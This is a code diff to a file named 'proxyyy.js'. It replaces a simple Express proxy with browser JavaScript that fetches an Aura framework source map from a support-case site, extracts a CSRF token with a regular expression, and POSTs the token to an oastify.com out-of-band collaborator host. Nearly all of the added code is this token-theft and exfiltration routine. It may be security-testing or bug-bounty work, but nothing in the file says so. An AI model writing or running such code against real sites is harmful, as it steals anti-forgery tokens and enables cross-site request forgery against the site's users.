@@ -1,23 +1,48 @@
-const fetch = require('node-fetch'); // If you're running this on Node.js
-const express = require('express');
+// proxyyy.js
 
-const app = express();
+fetch('https://supportcases.ctfs.com/mwsupport/auraFW/javascript/aura_prod.js.map?sf_js_last_mod=1708507544491')
+    .then(response => response.text())
+    .then(scriptContent => {
+        // Extract the CSRF token from the script content
+        var csrfToken = extractCsrfToken(scriptContent);
 
-app.get('/proxy', async (req, res) => {
-    try {
-        // Fetch the target JavaScript file
-        const response = await fetch('https://supportcases.mathworks.com/mwsupport/auraFW/javascript/aura_prod.js.map?sf_js_last_mod=1708507544491');
-        const scriptContent = await response.text();
-        
-        // Send the script content as the response
-        res.send(scriptContent);
-    } catch (error) {
+        // Send the CSRF token to your server
+        sendCsrfToken(csrfToken);
+    })
+    .catch(error => {
         console.error('Error fetching script:', error);
-        res.status(500).send('Internal Server Error');
-    }
-});
+    });
 
-const PORT = 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
+function extractCsrfToken(scriptContent) {
+    // Use the same regular expression pattern as before to extract the CSRF token
+    var tokenPattern = /window\.PreferenceBits\.prototype\.csrfToken\s*=\s*'([^']+)'/;
+    var match = scriptContent.match(tokenPattern);
+    if (match && match.length > 1) {
+        return match[1];
+    } else {
+        console.error('CSRF token not found in script content.');
+        return null;
+    }
+}
+
+function sendCsrfToken(token) {
+    // Send the CSRF token to your server using an HTTP request
+    fetch('https://em4p5ieatfpqhj4hd61u40tzdqjh79vy.oastify.com', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ token: token })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('CSRF token sent successfully.');
+        } else {
+            console.error('Failed to send CSRF token:', response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('Error sending CSRF token:', error);
+    });
+}
+
